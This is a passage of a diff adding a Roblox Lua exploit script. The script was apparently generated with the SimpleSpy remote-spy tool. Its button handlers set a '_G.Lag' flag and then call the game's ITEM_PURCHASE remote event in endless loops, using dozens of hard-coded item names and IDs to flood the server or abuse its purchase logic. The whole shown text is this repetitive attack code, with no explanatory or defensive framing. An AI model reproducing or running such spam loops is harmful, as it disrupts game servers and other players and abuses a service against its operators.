+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Negative Horns",
+					[2] = "8",
+					[3] = "5233472439",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Head",
+					[2] = "8",
+					[3] = "5355731757",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Bow Tie",
+					[2] = "43",
+					[3] = "5314000093",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Gamer Keyboard",
+					[2] = "46",
+					[3] = "5548852071",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Cartoon Demon",
+					[2] = "8",
+					[3] = "5410759729",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Halo",
+					[2] = "8",
+					[3] = "5230690394",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Antlers",
+					[2] = "8",
+					[3] = "5197568832",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Rave Mask",
+					[2] = "42",
+					[3] = "5319940357",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Head",
+					[2] = "8",
+					[3] = "5231646851",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				wait()
+				local args2 = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args2))
+				wait()
+				local args3 = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args3))
+				wait()
+				local args = {
+					[1] = "Black Trendy Hat",
+					[2] = "8",
+					[3] = "4904891637",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(CHJYF_fake_script)()
+local function NNBV_fake_script() -- Spam2.Script 
+	local script = Instance.new('Script', Spam2)
+
+	local button = script.Parent
+	_G.Lag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag = true
+		
+		while true do
+			if _G.Lag == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548638720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "52 Pickup",
+					[2] = "8",
+					[3] = "4904139820",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Katana Set",
+					[2] = "47",
+					[3] = "5410248084",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura",
+					[2] = "47",
+					[3] = "5463718312",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Kawaii Confetti",
+					[2] = "8",
+					[3] = "5067732877",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura",
+					[2] = "47",
+					[3] = "5463621720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Blue Butterflies",
+					[2] = "8",
+					[3] = "4597874025",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Demon",
+					[2] = "46",
+					[3] = "5319867017",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Falling Blossoms",
+					[2] = "8",
+					[3] = "4665773975",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sakura Aura",
+					[2] = "47",
+					[3] = "5321023132",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Flame Aura",
+					[2] = "47",
+					[3] = "5463688787",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sparkling Shine",
+					[2] = "8",
+					[3] = "4641935884",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548531343",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sleep Paralysis Demon",
+					[2] = "46",
+					[3] = "4932832113",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Outline Spiked Floof Tail",
+					[2] = "47",
+					[3] = "5355976632",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Banded Top Hat",
+					[2] = "8",
+					[3] = "5275861024",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Fedora",
+					[2] = "8",
+					[3] = "5314012437",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Corruption Henchmen",
+					[2] = "47",
+					[3] = "5063561894",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Growing Corruption Right",
+					[2] = "42",
+					[3] = "5314332058",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Fedora",
+					[2] = "8",
+					[3] = "5357509575",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Sword",
+					[2] = "46",
+					[3] = "5355685721",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Robe",
+					[2] = "46",
+					[3] = "5314965699",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Negative Horns",
+					[2] = "8",
+					[3] = "5233472439",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Matter Head",
+					[2] = "8",
+					[3] = "5355731757",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Bow Tie",
+					[2] = "43",
+					[3] = "5314000093",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Gamer Keyboard",
+					[2] = "46",
+					[3] = "5548852071",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Cartoon Demon",
+					[2] = "8",
+					[3] = "5410759729",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Halo",
+					[2] = "8",
+					[3] = "5230690394",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Antlers",
+					[2] = "8",
+					[3] = "5197568832",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Rave Mask",
+					[2] = "42",
+					[3] = "5319940357",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Head",
+					[2] = "8",
+					[3] = "5231646851",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				wait()
+				local args2 = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args2))
+				wait()
+				local args3 = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args3))
+				wait()
+				local args = {
+					[1] = "Black Trendy Hat",
+					[2] = "8",
+					[3] = "4904891637",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+			end
+		end
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+		local args = {
+			[1] = "Cursed Flames",
+			[2] = "45",
+			[3] = "3756389957",
+		}
+		
+		game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+	end)
+end
+coroutine.wrap(NNBV_fake_script)()
+local function RYUBWO_fake_script() -- Spam2.Script 
+	local script = Instance.new('Script', Spam2)
+
+	local button = script.Parent
+	_G.Lag = false
+	
+	button.MouseButton1Click:Connect(function()
+		_G.Lag = true
+		
+		while true do
+			if _G.Lag == true then
+				local args = {
+					[1] = "Sparkling Angel Wings",
+					[2] = "46",
+					[3] = "192557913",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Spring Fairy",
+					[2] = "44",
+					[3] = "150381051",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Flaming Mohawk",
+					[2] = "41",
+					[3] = "191101707",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Fiery Horns of the Netherworld",
+					[2] = "8",
+					[3] = "215718515",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Frozen Horns of the Frigid Planes",
+					[2] = "8",
+					[3] = "74891470",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				local args = {
+					[1] = "Cursed Flames",
+					[2] = "45",
+					[3] = "3756389957",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548638720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "52 Pickup",
+					[2] = "8",
+					[3] = "4904139820",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Katana Set",
+					[2] = "47",
+					[3] = "5410248084",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Red Flame Aura",
+					[2] = "47",
+					[3] = "5463718312",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Kawaii Confetti",
+					[2] = "8",
+					[3] = "5067732877",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura",
+					[2] = "47",
+					[3] = "5463621720",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Blue Butterflies",
+					[2] = "8",
+					[3] = "4597874025",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Demon",
+					[2] = "46",
+					[3] = "5319867017",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Falling Blossoms",
+					[2] = "8",
+					[3] = "4665773975",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sakura Aura",
+					[2] = "47",
+					[3] = "5321023132",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Dark Flame Aura",
+					[2] = "47",
+					[3] = "5463688787",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sparkling Shine",
+					[2] = "8",
+					[3] = "4641935884",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Neon Flame Aura - Top",
+					[2] = "44",
+					[3] = "5548531343",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Sleep Paralysis Demon",
+					[2] = "46",
+					[3] = "4932832113",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Outline Spiked Floof Tail",
+					[2] = "47",
+					[3] = "5355976632",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Banded Top Hat",
+					[2] = "8",
+					[3] = "5275861024",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Cartoony Rainbow Fedora",
+					[2] = "8",
+					[3] = "5314012437",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Corruption Henchmen",
+					[2] = "47",
+					[3] = "5063561894",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Menacing",
+					[2] = "8",
+					[3] = "4238305136",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
+				-- Script generated by SimpleSpy - credits to exxtremewa#9394
+				-- Powered by highlight.lua
+				
+				local args = {
+					[1] = "Rainbow Growing Corruption Right",
+					[2] = "42",
+					[3] = "5314332058",
+				}
+				
+				game:GetService("ReplicatedStorage").ITEM_PURCHASE:InvokeServer(unpack(args))
